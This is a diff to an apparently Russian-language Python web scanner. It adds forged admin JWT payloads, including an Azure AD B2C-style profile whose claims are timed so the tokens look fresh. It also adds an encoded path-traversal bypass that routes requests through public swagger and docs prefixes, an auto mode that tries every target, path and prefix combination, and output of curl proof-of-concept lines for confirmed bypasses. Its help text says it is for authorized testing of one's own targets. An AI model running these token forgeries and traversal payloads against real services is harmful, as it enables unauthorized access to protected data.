@@ -19,16 +19,33 @@ import concurrent.futures
 import hashlib
 import hmac
 import json
+import os
 import secrets
 import sys
+import time
 from dataclasses import dataclass, asdict, field
 from typing import Optional
 
 import requests
 
+try:
+    from tqdm import tqdm as _tqdm
+except ImportError:
+    _tqdm = None
+
 ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
-DEFAULT_JWT_PAYLOAD = {"sub": "admin", "user": "admin", "role": "admin", "admin": True}
 ALG_NONE_CASES = ("none", "None", "NONE")  # некоторые парсеры сравнивают alg регистрозависимо
+
+
+def default_jwt_payload() -> dict:
+    """Захардкоженный generic-admin payload. iat/nbf/exp считаются на момент
+    вызова (а не хранятся статично в коде), чтобы токен не выглядел просроченным
+    или подозрительно старым для сервера, который проверяет эти claims."""
+    now = int(time.time())
+    return {
+        "sub": "admin", "user": "admin", "role": "admin", "admin": True,
+        "iat": now, "nbf": now - 60, "exp": now + 60 * 60 * 24 * 365,
+    }
 
 # CVE-2025-29927: Next.js middleware authorization bypass (CVSS 9.1).
 # Уязвимые версии: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3.
@@ -97,26 +114,30 @@ def is_trivial_response(content: bytes, extra_trivial_values: Optional[set] = No
     return False
 
 
-# Шаблон claims в стиле Azure AD B2C токена - используется с --jwt-azure-b2c,
-# чтобы подделанный токен по структуре был похож на настоящий B2C-токен
-AZURE_B2C_DEFAULT_PAYLOAD = {
-    "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
-    "exp": 9999999999,
-    "nbf": 1000000000,
-    "aud": "00000000-0000-0000-0000-000000000000",
-    "sub": "00000000-0000-0000-0000-000000000000",
-    "oid": "00000000-0000-0000-0000-000000000000",
-    "tid": "00000000-0000-0000-0000-000000000000",
-    "tfp": "B2C_1_signupsignin",
-    "given_name": "Test",
-    "family_name": "Admin",
-    "name": "Test Admin",
-    "emails": ["admin@example.com"],
-    "idp": "local",
-    "roles": ["admin"],
-    "extension_Role": "admin",
-    "ver": "1.0",
-}
+def azure_b2c_jwt_payload() -> dict:
+    """Захардкоженный payload в стиле Azure AD B2C токена (iss/aud/oid/tfp/emails и т.п.) -
+    используется с --jwt-azure-b2c и автоматически как один из профилей в --full.
+    exp/nbf/iat считаются на момент вызова, а не хранятся статично в коде."""
+    now = int(time.time())
+    return {
+        "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
+        "exp": now + 60 * 60 * 24 * 365,
+        "nbf": now - 300,
+        "iat": now,
+        "aud": "00000000-0000-0000-0000-000000000000",
+        "sub": "00000000-0000-0000-0000-000000000000",
+        "oid": "00000000-0000-0000-0000-000000000000",
+        "tid": "00000000-0000-0000-0000-000000000000",
+        "tfp": "B2C_1_signupsignin",
+        "given_name": "Test",
+        "family_name": "Admin",
+        "name": "Test Admin",
+        "emails": ["admin@example.com"],
+        "idp": "local",
+        "roles": ["admin"],
+        "extension_Role": "admin",
+        "ver": "1.0",
+    }
 
 
 def parse_claim_overrides(claim_args: list[str]) -> dict:
@@ -382,6 +403,18 @@ def classify_jwt_verdict(baseline_ok: bool, jwt_checks: list) -> str:
     return "protected"
 
 
+def combine_jwt_verdicts(verdicts: list) -> str:
+    """Сводит вердикты нескольких JWT-профилей (generic_admin, azure_b2c, ...) в один,
+    беря наихудший (наиболее критичный) по приоритету."""
+    if "no_auth_required" in verdicts:
+        return "no_auth_required"
+    if "confirmed_vulnerable" in verdicts:
+        return "confirmed_vulnerable"
+    if "signature_not_validated" in verdicts:
+        return "signature_not_validated"
+    return "protected"
+
+
 @dataclass
 class CveCheck:
     cve_id: str
@@ -444,6 +477,179 @@ def check_cve_2025_29927(url: str, timeout: int, verify_ssl: bool, base_headers:
     return verdict, checks
 
 
+# ---------------------------------------------------------------------------
+# Обход авторизации через прокси-ресурс шлюза (AWS API Gateway {proxy+},
+# Swagger-прокси, nginx/Envoy location-блоки и т.п.)
+#
+# Идея: у защищённого ресурса (например /v1/pdt/esl-vendors/...) есть отдельный,
+# заведомо публичный прокси-путь (например /api/swagger/*), который смонтирован
+# на тот же бэкенд/интеграцию, но НЕ проходит через тот же authorizer/маппинг
+# ресурсов, что и прямой путь. Если внутри прокси-пути можно закодированной
+# точка-точкой "выйти" обратно на защищённый путь (path traversal), запрос
+# долетает до бэкенда так, будто пришёл легитимно через публичный прокси -
+# и authorizer, привязанный к прямому ресурсу, просто не вызывается.
+#
+# Используем ТОЛЬКО закодированные варианты ".." (%2e%2e и т.п.), т.к. буквальные
+# "../" почти всегда схлопываются HTTP-клиентом/прокси ещё до отправки, а смысл
+# атаки как раз в том, что API Gateway/сервер декодирует их позже, чем происходит
+# проверка авторизации по маршруту.
+PROXY_BYPASS_PAYLOADS = [
+    "%2e%2e/",
+    "%2e%2e%2f",
+    "..%2f",
+    "..%252f",
+    "%252e%252e/",
+    "%252e%252e%252f",
+    "..;/",
+    "%2e%2e/%2e%2e/",
+    "..%c0%af",
+]
+
+# Захардкоженный список публичных "прокси"-путей, которые чаще всего остаются
+# открытыми на API Gateway/reverse-proxy без авторизации (документация, swagger,
+# health, статика) и смонтированы на тот же бэкенд, что и защищённые ресурсы.
+# Используется в auto-режиме (--full + --paths), когда ручная карта
+# (--proxy-bypass-map) не задана: для каждого таргета x пути x префикса
+# генерируется набор traversal-пейлоадов из PROXY_BYPASS_PAYLOADS.
+COMMON_PROXY_PREFIXES = [
+    "api/swagger",
+    "swagger",
+    "swagger-ui",
+    "api-docs",
+    "api/docs",
+    "docs",
+    "openapi",
+    "api/openapi",
+    "redoc",
+    "public",
+    "static",
+    "assets",
+    "health",
+]
+
+
+def build_auto_proxy_bypass_pairs(targets: list[str], paths: list[str]) -> list[tuple[str, str]]:
+    """Автоматически генерирует пары (прямой_URL, шаблон_обхода) для КАЖДОЙ комбинации
+    таргет x путь x захардкоженный публичный префикс (COMMON_PROXY_PREFIXES), без
+    необходимости вручную писать --proxy-bypass-map. Payload-и подставляются позже,
+    в check_proxy_bypass_pair, из PROXY_BYPASS_PAYLOADS."""
+    pairs = []
+    for target in targets:
+        base = target.rstrip("/")
+        for path in paths:
+            p = path.lstrip("/")
+            direct_url = f"{base}/{p}"
+            for prefix in COMMON_PROXY_PREFIXES:
+                template = f"{base}/{prefix}/{{payload}}{p}"
+                pairs.append((direct_url, template))
+    return pairs
+
+
+@dataclass
+class ProxyBypassCheck:
+    payload: str
+    direct_url: str
+    bypass_url: str
+    status_code: Optional[int] = None
+    content_type: Optional[str] = None
+    body_size: Optional[int] = None
+    accepted: bool = False  # True = обходной запрос вернул реальные данные -> вероятный bypass
+    error: Optional[str] = None
+    curl_poc: Optional[str] = None
+    is_trivial_body: bool = False
+
+
+def read_proxy_bypass_map(path: str) -> list[tuple[str, str]]:
+    """Читает файл с парами 'прямой_URL => шаблон_обхода' (по одной паре на строку).
+    Шаблон обхода обязан содержать плейсхолдер '{payload}', в который по очереди
+    подставляется каждый вариант из PROXY_BYPASS_PAYLOADS.
+
+    Пример строки:
+    https://host/dev/api/v1/pdt/items?company=test => https://host/dev/api/swagger/{payload}v1/pdt/items?company=test
+
+    Пустые строки и строки, начинающиеся с '#', игнорируются.
+    """
+    pairs = []
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            for lineno, raw_line in enumerate(f, start=1):
+                line = raw_line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if "=>" not in line:
+                    print(f"[!] --proxy-bypass-map строка {lineno}: нет разделителя '=>', пропущена: {line}", file=sys.stderr)
+                    continue
+                direct_url, template = line.split("=>", 1)
+                direct_url = direct_url.strip()
+                template = template.strip()
+                if "{payload}" not in template:
+                    print(f"[!] --proxy-bypass-map строка {lineno}: в шаблоне нет '{{payload}}', пропущена: {line}", file=sys.stderr)
+                    continue
+                pairs.append((direct_url, template))
+    except FileNotFoundError:
+        print(f"[!] Файл не найден: {path}", file=sys.stderr)
+        sys.exit(1)
+    return pairs
+
+
+def check_proxy_bypass_pair(direct_url: str, bypass_template: str, timeout: int, verify_ssl: bool,
+                             headers: dict, ignore_trivial_body: bool = True,
+                             extra_trivial_values: Optional[set] = None) -> tuple[bool, Optional[int], str, list["ProxyBypassCheck"]]:
+    """Проверяет одну пару (прямой URL / шаблон обхода).
+    Возвращает (baseline_ok, baseline_status, verdict, checks).
+
+    Вердикты:
+    - "confirmed_bypass" - прямой доступ закрыт (не 200), но хотя бы один вариант
+      обхода через прокси-путь вернул реальные данные (200 + JSON/text + непустое
+      нетривиальное тело)
+    - "protected"        - прямой доступ закрыт, и все варианты обхода тоже отклонены
+    - "not_applicable"   - прямой доступ и так открыт (200) - тест обхода неинформативен
+    """
+    baseline_status = None
+    try:
+        resp = requests.get(direct_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=True)
+        baseline_status = resp.status_code
+        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
+        body_size = len(resp.content)
+        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
+        baseline_ok = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
+                       and body_size > 0 and not trivial)
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Прямой запрос {direct_url} завершился ошибкой: {e}", file=sys.stderr)
+        baseline_ok = False
+
+    checks = []
+    for payload in PROXY_BYPASS_PAYLOADS:
+        bypass_url = bypass_template.replace("{payload}", payload)
+        try:
+            resp = requests.get(bypass_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=True)
+        except requests.exceptions.RequestException as e:
+            checks.append(ProxyBypassCheck(payload=payload, direct_url=direct_url, bypass_url=bypass_url, error=str(e)))
+            continue
+
+        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
+        body_size = len(resp.content)
+        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
+        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
+                    and body_size > 0 and not trivial)
+
+        checks.append(ProxyBypassCheck(
+            payload=payload, direct_url=direct_url, bypass_url=bypass_url,
+            status_code=resp.status_code, content_type=content_type, body_size=body_size,
+            accepted=accepted, is_trivial_body=trivial,
+            curl_poc=f"curl -skL --path-as-is '{bypass_url}'",
+        ))
+
+    if baseline_ok:
+        verdict = "not_applicable"
+    elif any(c.accepted for c in checks):
+        verdict = "confirmed_bypass"
+    else:
+        verdict = "protected"
+
+    return baseline_ok, baseline_status, verdict, checks
+
+
 def read_targets(path: str) -> list[str]:
     targets = []
     try:
@@ -500,7 +706,8 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
                   jwt_identities: Optional[list] = None,
                   ignore_trivial_body: bool = True,
                   extra_trivial_values: Optional[set] = None,
-                  check_nextjs_cve: bool = False) -> CheckResult:
+                  check_nextjs_cve: bool = False,
+                  jwt_profiles: Optional[list] = None) -> CheckResult:
     try:
         resp = requests.request(
             method,
@@ -525,21 +732,32 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
     jwt_checks = []
     jwt_verdict = None
     if jwt_test:
-        if jwt_identities:
-            jwt_checks = run_jwt_checks_multi_identity(
-                url, timeout, verify_ssl, headers, jwt_secret,
-                jwt_payload or DEFAULT_JWT_PAYLOAD, jwt_identities,
-                jwt_header_name, jwt_cookie_name, rsa_pubkey_pem=jwt_rsa_pubkey_pem,
-                ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
-            )
-        else:
-            jwt_checks = run_jwt_checks(
-                url, timeout, verify_ssl, headers, jwt_secret,
-                jwt_payload or DEFAULT_JWT_PAYLOAD, jwt_header_name, jwt_cookie_name,
-                rsa_pubkey_pem=jwt_rsa_pubkey_pem,
-                ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
-            )
-        jwt_verdict = classify_jwt_verdict(baseline_ok, jwt_checks)
+        # jwt_profiles: список (имя_профиля, payload) - используется в --full, где сразу
+        # прогоняются оба захардкоженных профиля (generic_admin + azure_b2c). Без него -
+        # обычный однопрофильный режим (одиночный --jwt-payload/--jwt-azure-b2c/дефолт).
+        profiles = jwt_profiles if jwt_profiles else [(None, jwt_payload or default_jwt_payload())]
+        per_profile_verdicts = []
+        for profile_name, payload in profiles:
+            if jwt_identities:
+                checks = run_jwt_checks_multi_identity(
+                    url, timeout, verify_ssl, headers, jwt_secret,
+                    payload, jwt_identities,
+                    jwt_header_name, jwt_cookie_name, rsa_pubkey_pem=jwt_rsa_pubkey_pem,
+                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
+                )
+            else:
+                checks = run_jwt_checks(
+                    url, timeout, verify_ssl, headers, jwt_secret,
+                    payload, jwt_header_name, jwt_cookie_name,
+                    rsa_pubkey_pem=jwt_rsa_pubkey_pem,
+                    ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
+                )
+            if profile_name:
+                for c in checks:
+                    c.kind = f"{profile_name}:{c.kind}"
+            per_profile_verdicts.append(classify_jwt_verdict(baseline_ok, checks))
+            jwt_checks.extend(checks)
+        jwt_verdict = combine_jwt_verdicts(per_profile_verdicts)
 
     nextjs_cve_checks = []
     nextjs_cve_verdict = None
@@ -590,6 +808,82 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
     )
 
 
+def is_finding_result(result: "CheckResult") -> bool:
+    """True, если этот CheckResult вообще стоит записывать в results.json -
+    т.е. это находка: незащищённый эндпоинт (baseline 200 без токена) или
+    подтверждённый JWT-bypass, или подтверждённый обход CVE-2025-29927.
+    Обычные 'закрыто как надо' и 404/network-error результаты в файл не попадают."""
+    if result.ok:
+        return True
+    if result.jwt_verdict in ("confirmed_vulnerable", "signature_not_validated", "no_auth_required"):
+        return True
+    if result.nextjs_cve_verdict == "confirmed_bypass":
+        return True
+    return False
+
+
+def finding_result_dict(result: "CheckResult") -> dict:
+    """asdict(result), но с jwt_checks/nextjs_cve_checks, обрезанными до
+    только принятых (accepted=True) попыток - чтобы в файле были только
+    реальные PoC, а не десятки отклонённых негативных контролей."""
+    d = asdict(result)
+    d["jwt_checks"] = [c for c in d["jwt_checks"] if c.get("accepted")]
+    d["nextjs_cve_checks"] = [c for c in d["nextjs_cve_checks"] if c.get("accepted")]
+    return d
+
+
+def write_results_incremental(output_path: str, results: list, targets: list, use_proxy_format: bool,
+                               proxy_bypass_results: list) -> None:
+    """Пишет текущее накопленное состояние НАХОДОК в output_path немедленно, по мере
+    готовности - а не только один раз в самом конце прогона. В файл попадают ТОЛЬКО
+    подтверждённые обходы/уязвимости (см. is_finding_result и verdict='confirmed_bypass'
+    для proxy_bypass) - "чисто" закрытые эндпоинты и отклонённые попытки в JSON не пишутся,
+    хотя по-прежнему видны в консольном логе по ходу выполнения.
+
+    Файл перезаписывается целиком на каждый вызов (это простая и надёжная схема:
+    JSON в файле всегда валиден целиком, можно tail'ить/парсить в любой момент),
+    но запись идёт через временный файл + os.replace (атомарно), чтобы не
+    оставить файл в битом состоянии, если процесс прервут посреди записи.
+
+    use_proxy_format фиксируется один раз в начале прогона (по args.check_proxy_bypass),
+    а не по факту наличия proxy_bypass_results - иначе формат файла менялся бы
+    посреди прогона (сначала плоский список, потом объект {results, proxy_bypass}),
+    что ломает потребителей, которые уже начали читать файл.
+    """
+    order = {url: i for i, url in enumerate(targets)}
+    findings = [r for r in results if is_finding_result(r)]
+    findings_sorted = sorted(findings, key=lambda r: order.get(r.url, 0))
+
+    confirmed_proxy_bypass = [
+        (direct_url, template, baseline_ok, baseline_status, verdict, checks)
+        for direct_url, template, baseline_ok, baseline_status, verdict, checks in proxy_bypass_results
+        if verdict == "confirmed_bypass"
+    ]
+
+    if use_proxy_format:
+        payload = {
+            "results": [finding_result_dict(r) for r in findings_sorted],
+            "proxy_bypass": [
+                {
+                    "direct_url": direct_url,
+                    "template": template,
+                    "baseline_ok": baseline_ok,
+                    "baseline_status": baseline_status,
+                    "verdict": verdict,
+                    "checks": [asdict(c) for c in checks if c.accepted],
+                }
+                for direct_url, template, baseline_ok, baseline_status, verdict, checks in confirmed_proxy_bypass
+            ],
+        }
+    else:
+        payload = [finding_result_dict(r) for r in findings_sorted]
+
+    tmp_path = f"{output_path}.tmp"
+    with open(tmp_path, "w", encoding="utf-8") as f:
+        json.dump(payload, f, ensure_ascii=False, indent=2)
+    os.replace(tmp_path, output_path)
+
+
 def main():
     parser = argparse.ArgumentParser(description="Проверка таргетов на 200 OK, content-type и непустое тело")
     parser.add_argument("-f", "--file", required=True, help="Путь к файлу со списком таргетов (по одному URL/домену на строку)")
@@ -597,10 +891,16 @@ def main():
     parser.add_argument("-t", "--timeout", type=int, default=10, help="Таймаут запроса в секундах (по умолчанию 10)")
     parser.add_argument("-w", "--workers", type=int, default=10, help="Количество параллельных потоков (по умолчанию 10)")
     parser.add_argument("-m", "--method", default="GET", choices=["GET", "HEAD", "POST"], help="HTTP метод (по умолчанию GET; для HEAD тело обычно будет 0 байт)")
-    parser.add_argument("-o", "--output", help="Путь для сохранения результатов в JSON")
+    parser.add_argument("-o", "--output", help="Путь для сохранения НАХОДОК (только подтверждённые обходы/уязвимости, "
+                                                "не все проверки подряд) в JSON. Пишется инкрементально по ходу выполнения")
     parser.add_argument("--no-verify-ssl", action="store_true", help="Отключить проверку SSL сертификатов")
     parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок вида 'Key: Value' (можно указывать несколько раз)")
     parser.add_argument("--fail-only", action="store_true", help="Выводить в консоль только неуспешные проверки")
+    parser.add_argument("--tqdm", action="store_true",
+                         help="Показывать только прогресс-бар вместо построчного лога по каждому URL/JWT/CVE/payload'у "
+                              "(итоговые сводки и найденные уязвимости в конце всё равно печатаются). "
+                              "Требует пакет tqdm (pip install tqdm); если не установлен - выводится предупреждение "
+                              "и скрипт продолжает работу с обычным построчным логом")
     parser.add_argument("--allow-trivial-bodies", action="store_true",
                          help="Не отсеивать тривиальные health-check ответы (OK/HEALTHY/PONG и т.п.) - по умолчанию они считаются false positive и не засчитываются")
     parser.add_argument("--ignore-body-value", action="append", default=[], metavar="VALUE",
@@ -634,7 +934,53 @@ def main():
                                                       "под произвольного пользователя, а не только generic admin-доступ. "
                                                       "ВНИМАНИЕ: сильно увеличивает число запросов (N личностей x 7 видов токена x 2 доставки на URL)")
 
+    parser.add_argument("--full", action="store_true",
+                         help="Запустить сразу все проверки: --jwt-test, --check-nextjs-cve и (если задан "
+                              "--proxy-bypass-map) --check-proxy-bypass. Отдельные флаги можно комбинировать "
+                              "с --full как обычно (например --full --jwt-azure-b2c)")
+
+    proxy_group = parser.add_argument_group("Обход авторизации через прокси-ресурс шлюза (только для авторизованных проверок собственных таргетов)")
+    proxy_group.add_argument("--check-proxy-bypass", action="store_true",
+                              help="Проверить обход защищённого ресурса через закодированный path traversal (%%2e%%2e и т.п.) "
+                                   "внутри соседнего публичного прокси-пути (например /api/swagger/{payload}v1/...). "
+                                   "Актуально для AWS API Gateway {proxy+}, Swagger-прокси и подобных reverse-proxy маршрутов, "
+                                   "где authorizer привязан к конкретному ресурсу, а не к бэкенду в целом. Требует --proxy-bypass-map")
+    proxy_group.add_argument("--proxy-bypass-map",
+                              help="Путь к файлу с парами 'прямой_URL => шаблон_обхода' (по одной паре на строку), "
+                                   "шаблон обязан содержать плейсхолдер {payload}. Пример: "
+                                   "https://host/dev/api/v1/pdt/items?x=1 => https://host/dev/api/swagger/{payload}v1/pdt/items?x=1")
+
     args = parser.parse_args()
+
+    if args.tqdm and _tqdm is None:
+        print("[!] --tqdm: пакет tqdm не установлен (pip install tqdm), продолжаю с обычным построчным логом", file=sys.stderr)
+        args.tqdm = False
+
+    jwt_profiles = None  # None = обычный однопрофильный режим; список = --full, оба профиля сразу
+    if args.full:
+        args.jwt_test = True
+        args.check_nextjs_cve = True
+        enabled = ["--jwt-test (профили: generic_admin + azure_b2c)", "--check-nextjs-cve"]
+
+        # если пользователь явно не задал свой payload/claims/b2c-режим - под --full
+        # прогоняем ОБА захардкоженных JWT-профиля сразу, а не один на выбор
+        if not (args.jwt_payload or args.jwt_azure_b2c or args.jwt_claim):
+            jwt_profiles = [("generic_admin", default_jwt_payload()), ("azure_b2c", azure_b2c_jwt_payload())]
+
+        args.check_proxy_bypass = True
+        if args.proxy_bypass_map:
+            enabled.append("--check-proxy-bypass (ручная карта + auto-набор из COMMON_PROXY_PREFIXES)")
+        elif args.paths:
+            enabled.append(f"--check-proxy-bypass (auto: {len(COMMON_PROXY_PREFIXES)} публичных префиксов x {len(PROXY_BYPASS_PAYLOADS)} payload'ов на каждый путь из --paths)")
+        else:
+            print("[i] --full: для auto-обхода через прокси-ресурс нужен --paths (список защищённых путей типа /users, /api/v1/users) - без него проверка обхода пропущена", file=sys.stderr)
+            args.check_proxy_bypass = False
+
+        print(f"[*] --full: включены проверки: {', '.join(enabled)}")
+
+    if args.check_proxy_bypass and not args.proxy_bypass_map and not args.paths:
+        print("[!] --check-proxy-bypass требует --proxy-bypass-map и/или --paths (для auto-режима)", file=sys.stderr)
+        sys.exit(1)
 
     headers = {}
     for h in args.header:
@@ -644,9 +990,9 @@ def main():
         key, value = h.split(":", 1)
         headers[key.strip()] = value.strip()
 
-    jwt_payload = DEFAULT_JWT_PAYLOAD
+    jwt_payload = default_jwt_payload()
     if args.jwt_azure_b2c:
-        jwt_payload = AZURE_B2C_DEFAULT_PAYLOAD
+        jwt_payload = azure_b2c_jwt_payload()
     if args.jwt_payload:
         try:
             with open(args.jwt_payload, "r", encoding="utf-8") as f:
@@ -679,18 +1025,22 @@ def main():
     if not ignore_trivial_body:
         print("[*] Фильтрация тривиальных health-check ответов (OK/HEALTHY) ОТКЛЮЧЕНА (--allow-trivial-bodies)")
 
-    targets = read_targets(args.file)
-    if not targets:
+    raw_targets = read_targets(args.file)
+    if not raw_targets:
         print("[!] Список таргетов пуст.", file=sys.stderr)
         sys.exit(1)
 
-    paths = read_paths(args.paths) if args.paths else None
-    targets = build_urls(targets, paths)
+    raw_paths = read_paths(args.paths) if args.paths else None
+    paths = raw_paths
+    targets = build_urls(raw_targets, paths)
 
     if paths:
-        print(f"[*] Таргетов: {len(read_targets(args.file))} x путей: {len(paths)} = {len(targets)} URL. Запускаю проверку (потоков: {args.workers})...\n")
+        print(f"[*] Таргетов: {len(raw_targets)} x путей: {len(paths)} = {len(targets)} URL. Запускаю проверку (потоков: {args.workers})...\n")
     else:
         print(f"[*] Загружено таргетов: {len(targets)}. Запускаю проверку (потоков: {args.workers})...\n")
+
+    use_proxy_format = args.check_proxy_bypass  # фиксируем формат вывода один раз на весь прогон
+    proxy_bypass_results = []  # список (direct_url, template, baseline_ok, baseline_status, verdict, checks)
 
     results: list[CheckResult] = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
@@ -699,13 +1049,22 @@ def main():
                 check_target, url, args.timeout, args.method, not args.no_verify_ssl, headers,
                 args.jwt_test, args.jwt_secret, jwt_payload, args.jwt_header_name, args.jwt_cookie_name,
                 jwt_rsa_pubkey_pem, jwt_identities, ignore_trivial_body, extra_trivial_values,
-                args.check_nextjs_cve,
+                args.check_nextjs_cve, jwt_profiles,
             ): url
             for url in targets
         }
-        for future in concurrent.futures.as_completed(future_to_url):
+        completed = concurrent.futures.as_completed(future_to_url)
+        if args.tqdm:
+            completed = _tqdm(completed, total=len(future_to_url), desc="baseline/JWT/CVE", unit="url")
+        for future in completed:
             result = future.result()
             results.append(result)
+
+            if args.output:
+                write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)
+
+            if args.tqdm:
+                continue
 
             if args.fail_only and result.ok:
                 continue
@@ -808,13 +1167,81 @@ def main():
                         print(f"      - {r.url}  [payload='{cc.payload}']")
                         print(f"        PoC: {cc.curl_poc}")
 
+    if args.check_proxy_bypass:
+        pairs = []
+        if args.proxy_bypass_map:
+            pairs.extend(read_proxy_bypass_map(args.proxy_bypass_map))
+        if raw_paths:
+            auto_pairs = build_auto_proxy_bypass_pairs(raw_targets, raw_paths)
+            print(f"[*] Auto-режим: сгенерировано {len(auto_pairs)} пар обхода "
+                  f"({len(raw_targets)} таргетов x {len(raw_paths)} путей x {len(COMMON_PROXY_PREFIXES)} публичных префиксов)")
+            pairs.extend(auto_pairs)
+        pairs = list(dict.fromkeys(pairs))  # убираем точные дубликаты (direct_url, template), сохраняя порядок
+
+        if not pairs:
+            print("[!] Нет пар для проверки обхода: --proxy-bypass-map не задан или пуст, и --paths тоже не задан.", file=sys.stderr)
+        else:
+            print(f"\n[*] Проверка обхода через прокси-ресурс: {len(pairs)} пар x {len(PROXY_BYPASS_PAYLOADS)} payload'ов...\n")
+            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+                future_to_pair = {
+                    executor.submit(
+                        check_proxy_bypass_pair, direct_url, template, args.timeout, not args.no_verify_ssl,
+                        headers, ignore_trivial_body, extra_trivial_values,
+                    ): (direct_url, template)
+                    for direct_url, template in pairs
+                }
+                completed_pairs = concurrent.futures.as_completed(future_to_pair)
+                if args.tqdm:
+                    completed_pairs = _tqdm(completed_pairs, total=len(future_to_pair), desc="proxy-bypass", unit="pair")
+                for future in completed_pairs:
+                    direct_url, template = future_to_pair[future]
+                    baseline_ok, baseline_status, verdict, checks = future.result()
+                    proxy_bypass_results.append((direct_url, template, baseline_ok, baseline_status, verdict, checks))
+
+                    if args.output:
+                        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)
+
+                    if args.tqdm:
+                        continue
+
+                    print(f"[{'OPEN' if baseline_ok else 'closed'}] direct: {direct_url}  status={baseline_status}  via: {template}")
+                    for c in checks:
+                        if c.error:
+                            print(f"       └─ payload='{c.payload}' ({c.bypass_url}) ошибка: {c.error}")
+                        elif c.accepted:
+                            print(f"       └─ [!!! BYPASS] payload='{c.payload}': status={c.status_code} type={c.content_type} size={c.body_size}B")
+                            print(f"          PoC: {c.curl_poc}")
+                        else:
+                            trivial_note = " (health-check-подобное тело)" if c.is_trivial_body else ""
+                            print(f"       └─ payload='{c.payload}' ({c.bypass_url}) отклонён: status={c.status_code}{trivial_note}")
+
+                    verdict_labels = {
+                        "confirmed_bypass": "[!!! ПОДТВЕРЖДЕНО] прямой доступ закрыт, но обход через прокси-путь возвращает данные",
+                        "protected": "[OK] прямой доступ закрыт, все варианты обхода тоже отклонены",
+                        "not_applicable": "[i] прямой доступ и так открыт - тест обхода неинформативен",
+                    }
+                    print(f"       └─ ВЕРДИКТ: {verdict_labels.get(verdict, verdict)}")
+
+            confirmed = [r for r in proxy_bypass_results if r[4] == "confirmed_bypass"]
+            protected = [r for r in proxy_bypass_results if r[4] == "protected"]
+            na = [r for r in proxy_bypass_results if r[4] == "not_applicable"]
+            print(f"\n[*] Обход через прокси-ресурс - вердикты: подтверждён обход={len(confirmed)} | защищено={len(protected)} | не применимо={len(na)}")
+
+            if confirmed:
+                print(f"\n[!!!] ПОДТВЕРЖДЁН ОБХОД АВТОРИЗАЦИИ через прокси-ресурс ({len(confirmed)}):")
+                for direct_url, template, _, _, _, checks in confirmed:
+                    print(f"      - {direct_url}")
+                    for c in checks:
+                        if c.accepted:
+                            print(f"        payload='{c.payload}'  PoC: {c.curl_poc}")
+
     if args.output:
-        # сохраняем в исходном порядке файла
-        order = {url: i for i, url in enumerate(targets)}
-        results_sorted = sorted(results, key=lambda r: order.get(r.url, 0))
-        with open(args.output, "w", encoding="utf-8") as f:
-            json.dump([asdict(r) for r in results_sorted], f, ensure_ascii=False, indent=2)
-        print(f"[*] Результаты сохранены в {args.output}")
+        # Находки уже писались в файл по мере готовности (после каждого таргета и каждой
+        # пары обхода) через write_results_incremental - здесь просто финальная перезапись
+        # с полным, отсортированным по исходному порядку набором находок.
+        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)
+        print(f"[*] Найденные обходы/уязвимости сохранены в {args.output} (обновлялись по ходу выполнения; "
+              f"защищённые/безуспешные попытки в файл не пишутся, они есть только в консольном логе выше)")
 
     sys.exit(0 if fail_count == 0 else 2)
 
